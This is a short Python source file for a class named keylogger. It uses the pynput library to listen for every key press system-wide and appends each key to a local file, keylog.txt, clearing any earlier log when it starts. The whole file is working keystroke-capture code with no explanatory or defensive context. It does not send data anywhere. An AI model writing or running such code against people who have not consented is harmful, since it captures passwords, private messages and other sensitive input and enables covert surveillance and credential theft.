from pynput.keyboard import Listener
from pynput.keyboard import Key
import logging
import os

class keylogger:
    def __init__(self):
        path = "keylog.txt"
        if os.path.exists(path):
            os.remove(path)
        logging.basicConfig(handlers=[logging.FileHandler('keylog.txt', 'w', 'utf-8')], level=logging.DEBUG, format='%(message)s')
        logging.StreamHandler.terminator = " "
        self.listener = None

    def start(self):
        def on_press(key):
            key = str(key)
            if (key.startswith("Key.")): key = key[4:]
            else: key = key.strip('\'')
            logging.info(key)
        
        self.listener = Listener(on_press=on_press)
        logging.info("\n")
        self.listener.start()

    def stop(self):
        self.listener.stop()

